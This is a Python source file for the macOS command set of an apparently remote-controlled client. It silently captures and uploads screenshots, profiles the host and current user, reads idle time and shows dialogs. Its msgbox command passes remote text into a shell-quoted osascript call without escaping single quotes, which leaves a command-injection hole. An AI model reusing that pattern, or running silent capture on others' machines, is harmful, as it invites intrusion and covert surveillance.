import os
import subprocess
import sys
import time

from client.commands.argument_command_registry import argument_command
from client.commands.common import CommonCommands
from core.utils.decorator import desc
from core.utils.formatting import get_time, get_size, format_dict
from core.utils.logger import logger


class MacCommands(CommonCommands):
    """macOS 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)

    # ------------------ 内部工具 ------------------ #
    def _run_command_text(self, command: str) -> str:
        """
        执行命令并返回文本输出（失败时返回空字符串）
        """
        try:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            if result.returncode != 0:
                return ''
            return (result.stdout or '').strip()
        except Exception:
            return ''

    def _run_command_success(self, command: str) -> bool:
        """
        执行命令并返回是否成功
        """
        try:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            return result.returncode == 0
        except Exception:
            return False

    def _send_temp_file_result(self, file_path: str, preparing_text: str = ''):
        """
        发送临时文件结果并在外层 finally 中清理文件
        """
        if not os.path.isfile(file_path):
            self._send_final_result(0, 'Expected output file was not created')
            return

        if preparing_text:
            self._send_interim_result(1, preparing_text)

        self._send_interim_result(
            1,
            f'Preparing file transfer: {get_size(os.path.getsize(file_path))}'
        )
        self.socket.send_file(self.command_id, file_path)

    def _build_process_info(self):
        """
        构造当前 client 进程信息
        """
        import platform
        import psutil

        process = psutil.Process()
        executable_path = os.path.realpath(sys.executable)
        script_path = os.path.realpath(''.join(sys.argv))

        return {
            'hostname': platform.node(),
            'macos_version': platform.mac_ver()[0],
            'build_version': self._run_command_text('sw_vers -buildVersion'),
            'architecture': platform.machine(),
            'hardware_model': self._run_command_text('sysctl -n hw.model'),
            'cpu_brand': self._run_command_text('sysctl -n machdep.cpu.brand_string'),
            'cpu_cores': os.cpu_count(),
            'memory': f'{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB',
            'python_version': platform.python_version(),
            'process_id': os.getpid(),
            'current_user': process.username(),
            'launch_command': f'{executable_path} {script_path}',
            'process_uptime': f'{round(time.time() - process.create_time(), 2)}s',
            'cwd': os.getcwd()
        }

    def _build_acmd_usage(self, command_name: str, usage_lines: list[str], description: str = '') -> str:
        """
        构造 acmd 帮助文本
        """
        lines = [f'acmd {command_name}']
        if description:
            lines.append('')
            lines.append(description)

        if usage_lines:
            lines.append('')
            lines.append('Options:')
            lines.extend(usage_lines)

        return '\n'.join(lines).rstrip()

    def _escape_osascript_text(self, value: str) -> str:
        """
        转义 AppleScript 字符串
        """
        text = str(value or '')
        text = text.replace('\\', '\\\\')
        text = text.replace('"', '\\"')
        return text

    # ------------------ 已有命令优化 ------------------ #
    @desc("Capture a screenshot", group='platform')
    def screenshot(self):
        screenshot_path = f'screenshot_{get_time()}.png'
        capture_command = f'screencapture -x {screenshot_path}'

        try:
            self._send_interim_result(1, f'Capturing screen: {capture_command}')

            if not self._run_command_success(capture_command):
                self._send_final_result(0, 'Failed to capture screenshot')
                return

            self._send_interim_result(1, 'Screenshot captured successfully')
            self._send_temp_file_result(screenshot_path)
        except Exception as e:
            self._send_final_result(0, f'Failed to capture screenshot: {e}')
        finally:
            if os.path.isfile(screenshot_path):
                try:
                    os.remove(screenshot_path)
                except Exception:
                    pass

    @desc('Show system information', group='platform')
    def getinfo(self):
        try:
            system_info = self._build_process_info()
            return 1, format_dict(system_info)
        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to collect system information: {e}'

    @desc('Show user idle time', group='platform')
    def idletime(self):
        try:
            from Quartz import (
                CGEventSourceSecondsSinceLastEventType,
                kCGEventSourceStateHIDSystemState,
                kCGAnyInputEventType,
            )

            idle_seconds = CGEventSourceSecondsSinceLastEventType(
                kCGEventSourceStateHIDSystemState,
                kCGAnyInputEventType
            )
            return 1, f'User idle time: {idle_seconds:.2f} seconds'
        except Exception as e:
            return 0, f'Failed to read idle time: {e}'

    @argument_command('msgbox')
    def _acmd_msgbox(self, args_dict, payload=None):
        """
        acmd 实验命令：显示消息框
        用法：
        acmd msgbox --text "hello"
        acmd msgbox --title "Notice" --text "hello"
        acmd msgbox --title "Notice" --text "hello" --timeout 5
        acmd msgbox --help
        """
        try:
            if not isinstance(args_dict, dict):
                return 0, 'Invalid acmd args for msgbox'

            if args_dict.get('help') is True:
                return 1, self._build_acmd_usage(
                    'msgbox',
                    [
                        '--text <value>       Required. Dialog text',
                        '--title <value>      Optional. Dialog title',
                        '--timeout <seconds>  Optional. Auto close timeout on macOS',
                        '--help               Show this help message',
                    ],
                    description='Show a native macOS dialog'
                )

            text = str(args_dict.get('text') or '').strip()
            title = str(args_dict.get('title') or '').strip()
            timeout_value = args_dict.get('timeout')

            if not text:
                return 0, 'Usage: acmd msgbox --text <value> [--title <value>] [--timeout <seconds>]'

            escaped_text = self._escape_osascript_text(text)
            escaped_title = self._escape_osascript_text(title)

            applescript = f'display dialog "{escaped_text}" with title "{escaped_title}" buttons {{"OK"}} default button "OK"'

            if timeout_value not in (None, '', False):
                try:
                    timeout_seconds = int(str(timeout_value).strip())
                    if timeout_seconds > 0:
                        applescript += f' giving up after {timeout_seconds}'
                except Exception:
                    return 0, f'Invalid timeout value: {timeout_value}'

            command = f"osascript -e '{applescript}'"
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                text=True,
                encoding='utf-8',
                errors='replace'
            )

            if result.returncode != 0:
                return 0, result.stderr.strip() or 'Failed to show message box'

            return 1, f'Message box displayed: {title or "(no title)"}'
        except Exception as e:
            return 0, f'Failed to show message box: {e}'